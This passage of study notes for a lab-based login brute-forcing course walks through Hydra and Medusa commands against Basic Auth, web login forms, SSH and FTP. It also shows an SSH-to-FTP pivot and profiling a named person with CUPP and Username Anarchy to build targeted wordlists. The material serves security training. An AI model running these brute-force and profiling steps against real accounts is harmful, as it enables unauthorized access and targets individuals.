Authorization: Basic YWxpY2U6c2VjcmV0MTIz
```

<a id="s7-2"></a>
### 7.2 Exploiting Basic Auth with Hydra — Walkthrough
This exercise targets a spawned instance using Basic HTTP Authentication with a known username, `basic-auth-user`, leaving only the password to brute-force using the `http-get` Hydra service.

**Step 1 — Download the wordlist (if needed):**
```shellsession
SyedZainImam@htb[/htb]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt
```
`curl -s -O` silently downloads the file and saves it locally using its original filename.

**Step 2 — Run Hydra:**
```shellsession
SyedZainImam@htb[/htb]$ hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81
```
**Step-by-step breakdown:**
1. `-l basic-auth-user` sets the known, fixed username.
2. `-P 2023-200_most_used_passwords.txt` supplies the password wordlist to brute-force.
3. `127.0.0.1` is the target (the local instance).
4. `http-get /` tells Hydra to use the HTTP GET module against the root path `/`, matching how Basic Auth protects the resource.
5. `-s 81` overrides the default HTTP port with port 81, matching the instance's actual port.
6. Hydra tries each password from the wordlist against `basic-auth-user`, and once it finds the correct one, it prints the valid username/password pair, which can then be used to log in and retrieve the flag.

---

<a id="s8"></a>
## 8. Login Forms

<a id="s8-1"></a>
### 8.1 Understanding Login Forms
Beyond Basic Auth, most modern web applications use custom HTML login forms as their primary authentication mechanism. Despite differing visually, these forms share the same underlying mechanics: an HTML `<form>` containing `<input>` fields for username and password, plus a submit button. When submitted, the browser sends this data to the server, typically as a POST request. Understanding this structure is the starting point for any login-form brute-force attack, since the attacker needs to know exactly how the form transmits data before automating attempts against it.

<a id="s8-2"></a>
### 8.2 A Basic Login Form Example
This shows a minimal login form and the resulting HTTP request it generates, used to illustrate the mechanics of form submission.
```html
<form action="/login" method="post">
  <label for="username">Username:</label>
  <input type="text" id="username" name="username"><br><br>
  <label for="password">Password:</label>
  <input type="password" id="password" name="password"><br><br>
  <input type="submit" value="Submit">
</form>
```
Submitting this form sends:
```http
POST /login HTTP/1.1
Host: www.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=john&password=secret123
```
- `POST` indicates data is being sent to the server to perform an action (here, authentication).
- `/login` is the endpoint handling the login request.
- `Content-Type` specifies how the body data is encoded.
- `Content-Length` indicates the size of the request body.
- The body itself carries the username and password as key-value pairs — exactly the data Hydra needs to replicate in an automated attack.

<a id="s8-3"></a>
### 8.3 http-post-form
Hydra's `http-post-form` module is purpose-built to target login forms by automating POST requests and substituting username/password combinations into the request body. Its general syntax is:
```shellsession
SyedZainImam@htb[/htb]$ hydra [options] target http-post-form "path:params:condition_string"
```
This single-line format packs in the target path, form parameters, and the condition Hydra uses to judge success or failure — all three must be correctly identified before the attack will work.

<a id="s8-4"></a>
### 8.4 Understanding the Condition String
The condition string tells Hydra how to distinguish a failed login attempt from a successful one, and it can be based on either a failure signal or a success signal.
- **Failure condition (`F=...`)** — Most common approach; Hydra looks for a specific string (e.g., an error message) in the response. Example:
  ```bash
  hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"
  ```
  If "Invalid credentials" appears in the response, Hydra marks that attempt as failed and moves to the next combination.
- **Success condition (`S=...`)** — Used when there's no clear failure message but a distinct success signal exists, such as an HTTP 302 redirect or specific page content. Examples:
  ```bash
  hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
  hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=Dashboard"
  ```
  Hydra treats a 302 status, or the word "Dashboard" appearing in the response, as confirmation of a successful login.

<a id="s8-5"></a>
### 8.5 Manual Inspection
Before launching Hydra, it's essential to understand exactly how the target form works. Manual inspection means using the browser's developer tools ("Inspect") to view the raw HTML of the login form directly. In the module's example:
```html
<form method="POST">
    <h2>Login</h2>
    <label for="username">Username:</label>
    <input type="text" id="username" name="username">
    <label for="password">Password:</label>
    <input type="password" id="password" name="password">
    <input type="submit" value="Login">
</form>
```
This reveals the key details Hydra needs: the form uses the `POST` method, and the two relevant fields are named `username` and `password`. Without this step, there's no reliable way to know what parameter names to feed into the `http-post-form` string.

<a id="s8-6"></a>
### 8.6 Browser Developer Tools
In addition to viewing the static HTML, opening the browser's Developer Tools (F12) and checking the "Network" tab while submitting a sample login attempt reveals the actual POST request sent to the server — including form data, headers, and the server's response. This confirms (rather than just infers) the real target path and parameter names, in this case reconfirming the path `/` and the parameters `username` and `password`, giving confidence that the Hydra command will be built correctly.

<a id="s8-7"></a>
### 8.7 Proxy Interception
For more complex forms (e.g., those using tokens or additional hidden fields), intercepting traffic with a proxy tool like Burp Suite or OWASP ZAP provides the deepest level of visibility. By routing browser traffic through the proxy and submitting the form, every component of the POST request can be dissected in detail, including exact parameter names and values — useful when developer tools alone aren't sufficient to fully understand the request.

<a id="s8-8"></a>
### 8.8 Constructing the params String for Hydra — Full Walkthrough
After identifying the form's structure, the next step is building the `params` string that Hydra will use for the attack. This string mimics a real form submission and consists of three components: the form parameters (with `^USER^`/`^PASS^` placeholders), any additional required fields (like CSRF tokens), and the success/failure condition.

Based on the earlier analysis — form posts to `/`, fields named `username` and `password`, and an "Invalid credentials" error on failure — the resulting params string is:
```bash
/:username=^USER^&password=^PASS^:F=Invalid credentials
```
- `/` — the submission path.
- `username=^USER^&password=^PASS^` — the form fields with Hydra's placeholders.
- `F=Invalid credentials` — the failure condition Hydra watches for.

**Step 1 — Download the wordlists (if needed):**
```shellsession
SyedZainImam@htb[/htb]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
SyedZainImam@htb[/htb]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
```
These fetch the username and password wordlists used for this attack.

**Step 2 — Run Hydra:**
```shellsession
SyedZainImam@htb[/htb]$ hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```
**Step-by-step breakdown:**
1. `-L top-usernames-shortlist.txt` supplies the list of candidate usernames.
2. `-P 2023-200_most_used_passwords.txt` supplies the list of candidate passwords.
3. `-f` enables fast mode, stopping as soon as one valid combination is found.
4. `IP` is the target host (replace with the real instance IP).
5. `-s 5000` sets the target port to 5000, matching the instance.
6. `http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"` is the constructed params string described above.
7. Hydra tries every username/password combination from the two lists, checking each response for "Invalid credentials" — any attempt that doesn't trigger that string is flagged as a potential success, revealing the valid login to use for retrieving the flag.

---

<a id="s9"></a>
## 9. Medusa

<a id="s9-1"></a>
### 9.1 What is Medusa?
Medusa is a fast, massively parallel, and modular login brute-forcer, designed to support a wide range of services that allow remote authentication. Like Hydra, its goal is to let penetration testers systematically assess how resilient login systems are against brute-force attacks, but with its own distinct syntax and module system.

<a id="s9-2"></a>
### 9.2 Installation
Medusa is commonly pre-installed on penetration testing distributions, and its presence can be checked directly.

**Check if installed:**
```shellsession
SyedZainImam@htb[/htb]$ medusa -h
```
This displays Medusa's help output if it's already installed.

**Install if missing:**
```shellsession
SyedZainImam@htb[/htb]$ sudo apt-get -y update
SyedZainImam@htb[/htb]$ sudo apt-get -y install medusa
```
This updates the package index and installs Medusa, auto-confirming with `-y`.

<a id="s9-3"></a>
### 9.3 Command Syntax and Parameter Table
Medusa's general syntax is:
```shellsession
SyedZainImam@htb[/htb]$ medusa [target_options] [credential_options] -M module [module_options]
```
This modular approach lets you combine target, credential, and module-specific flags to build a precise attack.

| Parameter | Explanation | Usage Example |
|---|---|---|
| `-h HOST` / `-H FILE` | Single target host, or a file of targets | `medusa -h 192.168.1.10 ...` / `medusa -H targets.txt ...` |
| `-u USERNAME` / `-U FILE` | Single username, or a file of usernames | `medusa -u admin ...` / `medusa -U usernames.txt ...` |
| `-p PASSWORD` / `-P FILE` | Single password, or a file of passwords | `medusa -p password123 ...` / `medusa -P passwords.txt ...` |
| `-M MODULE` | Module to use for the attack | `medusa -M ssh ...` |
| `-m "MODULE_OPTION"` | Extra parameters required by the module | `medusa -M http -m "POST /login.php ..."` |
| `-t TASKS` | Number of parallel login attempts | `medusa -t 4 ...` |
| `-f` / `-F` | Stop after first success (current host / any host) | `medusa -f ...` / `medusa -F ...` |
| `-n PORT` | Non-default port | `medusa -n 2222 ...` |
| `-v LEVEL` | Verbosity level, up to 6 | `medusa -v 4 ...` |

<a id="s9-4"></a>
### 9.4 Medusa Modules
Each Medusa module is written to understand one specific authentication protocol, sending the correct requests and interpreting the correct responses for that service.

| Medusa Module | Protocol | Description | Usage Example |
|---|---|---|---|
| FTP | File Transfer Protocol | Brute-force FTP logins | `medusa -M ftp -h 192.168.1.100 -u admin -P passwords.txt` |
| HTTP | HTTP | Brute-force web login forms (GET/POST) | `medusa -M http -h www.example.com -U users.txt -P passwords.txt -m DIR:/login.php -m FORM:username=^USER^&password=^PASS^` |
| IMAP | IMAP | Brute-force IMAP logins | `medusa -M imap -h mail.example.com -U users.txt -P passwords.txt` |
| MySQL | MySQL | Brute-force DB credentials | `medusa -M mysql -h 192.168.1.100 -u root -P passwords.txt` |
| POP3 | POP3 | Brute-force email retrieval logins | `medusa -M pop3 -h mail.example.com -U users.txt -P passwords.txt` |
| RDP | RDP | Brute-force Windows remote desktop logins | `medusa -M rdp -h 192.168.1.100 -u admin -P passwords.txt` |
| SSHv2 | SSH | Brute-force SSH logins | `medusa -M ssh -h 192.168.1.100 -u root -P passwords.txt` |
| Subversion (SVN) | SVN | Brute-force SVN repository logins | `medusa -M svn -h 192.168.1.100 -u admin -P passwords.txt` |
| Telnet | Telnet | Brute-force Telnet logins | `medusa -M telnet -h 192.168.1.100 -u admin -P passwords.txt` |
| VNC | VNC | Brute-force VNC logins | `medusa -M vnc -h 192.168.1.100 -P passwords.txt` |
| Web Form | HTTP Forms | Brute-force website login forms via POST | `medusa -M web-form -h www.example.com -U users.txt -P passwords.txt -m FORM:"username=^USER^&password=^PASS^:F=Invalid"` |

<a id="s9-5"></a>
### 9.5 Targeting an SSH Server — Example
```shellsession
SyedZainImam@htb[/htb]$ medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh
```
**Step-by-step:**
1. `-h 192.168.0.100` targets the specified host.
2. `-U usernames.txt` supplies the username candidates.
3. `-P passwords.txt` supplies the password candidates.
4. `-M ssh` selects the SSH module.
5. Medusa systematically tries each username/password pair against the SSH service to attempt unauthorized access.

<a id="s9-6"></a>
### 9.6 Targeting Multiple Web Servers with Basic HTTP Authentication — Example
```shellsession
SyedZainImam@htb[/htb]$ medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET
```
**Step-by-step:**
1. `-H web_servers.txt` iterates through a list of web server addresses rather than a single host.
2. `-U usernames.txt` / `-P passwords.txt` supply the credential lists.
3. `-M http` selects the HTTP module.
4. `-m GET` sets the HTTP method to GET for the authentication attempts.
5. Medusa runs multiple threads to check each listed server efficiently for weak credentials.

<a id="s9-7"></a>
### 9.7 Testing for Empty or Default Passwords — Example
```shellsession
SyedZainImam@htb[/htb]$ medusa -h 10.0.0.5 -U usernames.txt -e ns -M service_name
```
**Step-by-step:**
1. `-h 10.0.0.5` targets the specified host.
2. `-U usernames.txt` supplies the usernames to test.
3. `-e ns` enables two extra checks: `n` tests an empty password, and `s` tests a password matching the username.
4. `-M service_name` is replaced with the actual service module being tested.
5. Medusa tries each username first with a blank password, then with the password equal to the username, to reveal accounts with weak or default configurations.

---

<a id="s10"></a>
## 10. Web Services (SSH + FTP Practical Walkthrough)

<a id="s10-1"></a>
### 10.1 Context: SSH and FTP
SSH is a cryptographic protocol providing a secure channel for remote login, command execution, and file transfers, and its encryption makes it much safer than unencrypted alternatives like Telnet — but weak passwords still undermine that security. FTP, by contrast, is a standard protocol for transferring files that transmits data, including credentials, in cleartext, making it inherently more vulnerable to interception and brute-forcing. This section walks through using Medusa against both services in a single connected attack chain, illustrating how a pentester pivots from one compromised service to discover and attack another.

<a id="s10-2"></a>
### 10.2 Kick-off — Attacking SSH
With a known username, `sshuser`, Medusa is used to brute-force the SSH password.
```shellsession
SyedZainImam@htb[/htb]$ medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
```
**Step-by-step:**
1. `-h <IP>` specifies the target system's IP address.
2. `-n <PORT>` specifies the SSH port (typically 22).
3. `-u sshuser` sets the known username to test.
4. `-P 2023-200_most_used_passwords.txt` supplies a wordlist of commonly used passwords.
5. `-M ssh` selects the SSH module.
6. `-t 3` sets 3 parallel login attempts; increasing this speeds up the attack but raises the chance of detection or triggering defenses.
7. Medusa cycles through the wordlist and, on success, prints the correct password, as shown in the sample output: `ACCOUNT FOUND: [ssh] Host: IP User: sshuser Password: 1q2w3e4r5t [SUCCESS]`.

<a id="s10-3"></a>
### 10.3 Gaining Access
Once the password is found, connect to the system directly over SSH:
```shellsession
SyedZainImam@htb[/htb]$ ssh sshuser@<IP> -p PORT
```
This opens an interactive SSH session using the cracked credentials, giving command-line access to the remote system — the actual goal of the brute-force attack.

<a id="s10-4"></a>
### 10.4 Expanding the Attack Surface
After gaining SSH access, the next step is reconnaissance from inside the system to find further attack surfaces.

**List listening ports/services:**
```shellsession
SyedZainImam@htb[/htb]$ netstat -tulpn | grep LISTEN
```
`netstat -tulpn` lists TCP/UDP listening sockets with process info, and piping to `grep LISTEN` filters the output to only actively listening services. The sample output reveals a service listening on port 21 in addition to SSH on port 22.

**Confirm the service with nmap:**
```shellsession
SyedZainImam@htb[/htb]$ nmap localhost
```
Running `nmap` against `localhost` scans and identifies open ports and their associated services, confirming that port 21 is running an FTP server — turning the netstat observation into a confirmed, named target.

<a id="s10-5"></a>
### 10.5 Targeting the FTP Server
Exploring the `/home` directory on the compromised system reveals a folder named `ftpuser`, suggesting that's likely the FTP server's username. This is used to build the next Medusa command:
```shellsession
SyedZainImam@htb[/htb]$ medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
```
**Step-by-step:**
1. `-h 127.0.0.1` targets the local system, since the FTP server runs locally; using an IP tells Medusa explicitly to use IPv4.
2. `-u ftpuser` sets the username discovered from the `/home` directory.
3. `-P 2020-200_most_used_passwords.txt` supplies a password wordlist.
4. `-M ftp` selects the FTP module.
5. `-t 5` increases parallel attempts to 5 for faster cracking.
6. Medusa tries each password against the FTP service and reports success with `ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: ... Password: ... [SUCCESS]`.

<a id="s10-6"></a>
### 10.6 Retrieving the Flag
With valid FTP credentials, connect and download the flag file.
```shellsession
SyedZainImam@htb[/htb]$ ftp ftp://ftpuser:<FTPUSER_PASSWORD>@localhost
```
This connects to the FTP server using the cracked username/password embedded directly in the URL.

Inside the FTP session, the `ls` command lists the directory contents (revealing `flag.txt`), and `get flag.txt` downloads that file to the local machine; `exit` then closes the FTP session.

**Read the flag:**
```shellsession
SyedZainImam@htb[/htb]$ cat flag.txt
HTB{...}
```
`cat` prints the contents of the downloaded file, revealing the flag and completing the exercise — demonstrating how an initial SSH compromise via brute force can be pivoted into discovering and compromising an entirely separate service (FTP) on the same host.

---

<a id="s11"></a>
## 11. Custom Wordlists

<a id="s11-1"></a>
### 11.1 Why Custom Wordlists?
Pre-made wordlists like rockyou or SecLists are broad and generic, casting a wide net that may miss specific individuals or organizations with unique naming or password conventions. For example, targeting a specific employee like "Thomas Edison" with a massive generic username list is unlikely to succeed, since his actual username could follow any number of company-specific conventions. Custom wordlists solve this by being built specifically around the target, using information gathered from sources like social media, company directories, or leaked data — producing a smaller, far more relevant list that increases both efficiency and success rate compared to a generic approach.

<a id="s11-2"></a>
### 11.2 Username Anarchy
Even a simple name like "Jane Smith" can generate a large number of plausible username variations once middle names, birth years, hobbies, leetspeak substitutions, or personal interests are factored in (e.g., `janemarie`, `smithj87`, `j4n3`, `potterheadjane`). Username Anarchy is a tool designed to automatically generate this wide range of realistic username permutations from just a first and last name, covering patterns most people wouldn't think to try manually.

**List available username patterns:**
```shellsession
SyedZainImam@htb[/htb]$ ./username-anarchy -l
```
This prints all the generation plugins the tool supports (e.g., `first`, `firstlast`, `first.last`, `flast`, `lfirst`, `FLast`, etc.), each representing a different naming convention it can produce.

**Step 1 — Install Ruby and clone the tool:**
```shellsession
SyedZainImam@htb[/htb]$ sudo apt install ruby -y
SyedZainImam@htb[/htb]$ git clone https://github.com/urbanadventurer/username-anarchy.git
SyedZainImam@htb[/htb]$ cd username-anarchy
```
Username Anarchy is a Ruby script, so Ruby must be installed first; the `git clone` command downloads the tool's repository, and `cd` moves into its directory to run it.

**Step 2 — Generate usernames for a target:**
```shellsession
SyedZainImam@htb[/htb]$ ./username-anarchy Jane Smith > jane_smith_usernames.txt
```
Running the script with a first and last name generates a full list of plausible username combinations — basic combinations (`janesmith`, `jane.smith`), initials (`js`, `j.s.`), and more — redirected into `jane_smith_usernames.txt` for later use in a brute-force attack.

<a id="s11-3"></a>
### 11.3 CUPP (Common User Passwords Profiler)
While Username Anarchy handles usernames, CUPP creates highly personalized password wordlists built from gathered intelligence about a specific target. Its effectiveness depends entirely on the depth of information fed into it — the more personal details available (from social media, company websites, public records, or news articles), the more accurate the resulting password guesses. CUPP generates variations including original/capitalized forms, reversed strings, birthdate-based passwords, concatenations, appended special characters or numbers, leetspeak substitutions, and combined mutations (e.g., `Jane1994!`, `smith2708@`) — producing a wordlist far more likely to contain the real password than any generic dictionary.

**Install CUPP (if not already present, e.g., on Pwnbox):**
```shellsession
SyedZainImam@htb[/htb]$ sudo apt install cupp -y
```

**Run CUPP in interactive mode:**
```shellsession
SyedZainImam@htb[/htb]$ cupp -i
```
This launches an interactive questionnaire, prompting for details such as first name, surname, nickname, birthdate, partner's name/nickname/birthdate, child's details, pet's name, company name, and optional keywords — along with yes/no prompts for appending special characters, random numbers, and enabling leetspeak substitutions. Once all answers are provided (blank entries are allowed for unknown fields), CUPP compiles and saves the resulting password list to a file (e.g., `jane.txt`), reporting the total word count generated.

**Filtering CUPP output against a password policy:**
Given a policy requiring minimum 6 characters, at least one uppercase letter, one lowercase letter, one number, and at least two special characters from `!@#$%^&*`, the generated list can be filtered with chained `grep` commands:
```shellsession
SyedZainImam@htb[/htb]$ grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
```
**Step-by-step:**
1. `grep -E '^.{6,}$'` keeps only lines with at least 6 characters (minimum length).
2. `grep -E '[A-Z]'` further narrows to lines containing at least one uppercase letter.
3. `grep -E '[a-z]'` further narrows to lines containing at least one lowercase letter.
4. `grep -E '[0-9]'` further narrows to lines containing at least one digit.
5. `grep -E '([!@#$%^&*].*){2,}'` keeps only lines with at least two characters from the special-character set.
6. The final filtered result is saved to `jane-filtered.txt`, narrowing the original ~46,000 passwords down to roughly ~7,900 policy-compliant candidates — a dramatically smaller, more targeted attack list.

**Final attack — using both generated lists with Hydra:**
```shellsession
SyedZainImam@htb[/htb]$ hydra -L jane_smith_usernames.txt -P jane-filtered.txt IP -s PORT -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
```
**Step-by-step:**
1. `-L jane_smith_usernames.txt` supplies the custom username list generated by Username Anarchy.
2. `-P jane-filtered.txt` supplies the custom, policy-filtered password list generated by CUPP + grep.
3. `IP` and `-s PORT` specify the target instance's address and port.
4. `-f` stops the attack once a valid pair is found.
5. `http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"` is the condition string targeting the login form, matching the same structure covered in Section 8.
6. Hydra systematically tests combinations of the two custom lists against the target until it finds a valid username/password pair, which can then be used to log in and retrieve the flag.

---

*End of notes — HTB Academy "Login Brute Forcing" module, Sections 1–11.*
